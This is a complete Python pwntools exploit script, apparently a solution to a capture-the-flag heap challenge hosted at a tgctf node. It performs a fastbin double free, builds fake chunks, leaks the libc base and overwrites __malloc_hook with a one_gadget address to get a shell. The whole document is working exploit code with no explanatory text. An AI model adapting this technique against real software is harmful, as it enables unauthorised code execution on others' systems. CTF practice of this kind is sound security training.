from pwn import *

context(log_level="debug", arch="amd64", os="linux")
io = process(
    ["/home/gets/hznu/heap/ld.so.2", "./pwn"],
    env={"LD_PRELOAD": "/home/gets/hznu/heap/libc.so.6"},
)

io = remote("node1.tgctf.woooo.tech",32203)
elf = ELF("./pwn")
libc = ELF("libc.so.6")


def dbg():
    gdb.attach(io)


io.recv()
payload = p64(0) + p64(0x7F)
payload = payload.ljust(0x70, b"\x00")
payload += p64(0x7F)
io.sendline(payload)


def add(size, content):
    io.recvuntil(b"> ")
    io.sendline(str(1))
    io.recvuntil(b"> ")
    io.sendline(str(size))
    io.recvuntil(b"> ")
    io.sendline(content)


def free(idx):
    io.recvuntil(b"> ")
    io.sendline(str(2))
    io.recvuntil(b"> ")
    io.sendline(str(idx))


def new(con):
    io.recvuntil(b"> ")
    io.sendline(str(3))
    io.recvuntil(b"> ")
    io.send(con)


add(0x60, b"a")  # 0
add(0x60, b"a")  # 1
add(0x60, b"a")  # 2
free(0)
free(1)
free(0)
add(0x60, p64(0x6020c0))  # 3
add(0x60, b"a")  # 4
add(0x60, b"a")  # 5
add(0x60, b"a")  # 6
payload = p64(0) + p64(0x91)
payload = payload.ljust(0x98, b"a")
payload += p64(0x21) + p64(0) * 3 + p64(0x21)
new(payload)
free(6)
payload = b"a" * 0xF + p8(0x91)
new(payload)
libc.address = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00")) - 0x3C4B78
info("libc base: " + hex(libc.address))
new(p64(0) + p64(0x21))
free(1)
free(0)
free(1)
add(0x60, p64(libc.sym["__malloc_hook"] - 0x23))  # 7
add(0x60, b"a")
add(0x60, b"a")
one = [0x4527a, 0xf03a4, 0xf1247]
add(0x60, b"a" * 0x13 + p64(libc.address + one[2]))  # 10
io.recv()
io.sendline(str(1))
io.recvuntil(b"> ")
io.sendline(str(0x60))
io.interactive()
